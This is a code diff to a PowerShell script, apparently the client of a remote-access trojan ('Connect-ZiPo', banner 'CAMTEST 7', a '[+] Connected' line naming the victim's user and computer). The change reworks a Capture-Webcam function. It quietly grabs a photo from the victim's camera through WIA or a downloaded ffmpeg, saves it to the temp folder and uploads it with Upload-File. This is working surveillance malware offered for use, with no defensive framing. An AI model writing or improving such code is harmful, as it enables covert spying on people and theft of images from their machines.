@@ -280,9 +280,9 @@ function Connect-ZiPo {
         return Upload-File $path
     }
 
-    function Capture-Webcam {
+   function Capture-Webcam {
     try {
-        # Попытка захвата через WIA
+        # Попытка захвата через WIA (если камера доступна через WIA)
         $manager = New-Object -ComObject WIA.DeviceManager
         foreach ($deviceInfo in $manager.DeviceInfos) {
             try {
@@ -297,8 +297,7 @@ function Connect-ZiPo {
             }
         }
         
-        # Если WIA не обнаружила камеры, пробуем использовать ffmpeg
-        # Если глобальная переменная $global:ffmpegPath не установлена или файл не найден, пытаемся проверить PATH
+        # Если WIA не обнаружила камеру, пробуем использовать ffmpeg (fallback)
         if (-not $global:ffmpegPath -or -not (Test-Path $global:ffmpegPath)) {
             $ffmpegPath = "ffmpeg"
             Write-Host "[*] No camera found via WIA. Checking ffmpeg in PATH..." -ForegroundColor Cyan
@@ -308,7 +307,7 @@ function Connect-ZiPo {
                 $downloadResult = Download-Ffmpeg
                 Write-Host $downloadResult
                 if ($downloadResult -match "^\[\+\]") {
-                    # Извлекаем путь из возвращённой строки, если он есть
+                    # Извлекаем путь к ffmpeg.exe из возвращаемой строки
                     $global:ffmpegPath = ($downloadResult -replace "^\[\+\].+to:\s+","").Trim()
                 }
                 else {
@@ -324,33 +323,48 @@ function Connect-ZiPo {
         $tempImage = "$env:TEMP\webcam_ffmpeg.jpg"
         $ffmpegExec = $global:ffmpegPath
         
-        # Получаем список устройств через ffmpeg (с live логированием)
+        # Получаем список устройств через ffmpeg и сохраняем вывод
         $cameraOutput = & cmd /c "`"$ffmpegExec`" -list_devices true -f dshow -i dummy" 2>&1
         Write-Host "[*] ffmpeg device list:" -ForegroundColor Cyan
         Write-Host $cameraOutput
         
-        # Извлекаем название первого найденного устройства DirectShow
-        $cameraName = ($cameraOutput | Select-String "DirectShow video devices" -Context 0,10 |
-                       ForEach-Object { ($_ -split '"')[1] } | Select-Object -First 1)
-        if ($cameraName) {
-            Write-Host "[*] Camera detected: $cameraName. Capturing image..." -ForegroundColor Cyan
-            Start-Process -FilePath $ffmpegExec -ArgumentList "-f dshow -i video=`"$cameraName`" -frames:v 1 `"$tempImage`"" -NoNewWindow -Wait
-            if (Test-Path $tempImage) {
-                Write-Host "[*] Image captured successfully." -ForegroundColor Cyan
-                return Upload-File $tempImage
-            }
-            else {
-                return "[ERROR] Failed to capture image using ffmpeg."
+        # Ищем строки, содержащие "(video)" – они обычно содержат имя камеры
+        $cameraName = $null
+        $cameraLines = $cameraOutput | Select-String "(video)"
+        if ($cameraLines) {
+            foreach ($line in $cameraLines) {
+                # Пример строки: "USBCamera" (video)
+                if ($line.ToString() -match '"([^"]+)"\s*\(video\)') {
+                    $cameraName = $Matches[1]
+                    break
+                }
+                # Если строка вида video=USBCamera (без кавычек)
+                elseif ($line.ToString() -match 'video="?([^"]+)"?\s*\(video\)') {
+                    $cameraName = $Matches[1]
+                    break
+                }
             }
         }
-        else {
+        
+        if (-not $cameraName -or [string]::IsNullOrWhiteSpace($cameraName)) {
             return "[ERROR] ffmpeg fallback did not detect any camera."
+        }
+        
+        Write-Host "[*] Camera detected: $cameraName. Capturing image..." -ForegroundColor Cyan
+        Start-Process -FilePath $ffmpegExec -ArgumentList "-f dshow -i video=`"$cameraName`" -frames:v 1 `"$tempImage`"" -NoNewWindow -Wait
+        if (Test-Path $tempImage) {
+            Write-Host "[*] Image captured successfully." -ForegroundColor Cyan
+            return Upload-File $tempImage
+        }
+        else {
+            return "[ERROR] Failed to capture image using ffmpeg."
         }
     }
     catch {
         return "[ERROR] Webcam capture failed: $($_.Exception.Message)"
     }
 }
+
 
 
 
@@ -429,7 +443,7 @@ ${esc}[31m
     \ \  \_|  \ \  \_|\ \ \  \ \  \ \  \____
      \ \__\    \ \_______\ \__\ \__\ \_______\
       \|__|     \|_______|\|__|\|__|\|_______|
-                CAMTEST 6
+                CAMTEST 7
 ${esc}[0m
 
 ${esc}[32m[+] Connected :: $env:USERNAME@$env:COMPUTERNAME
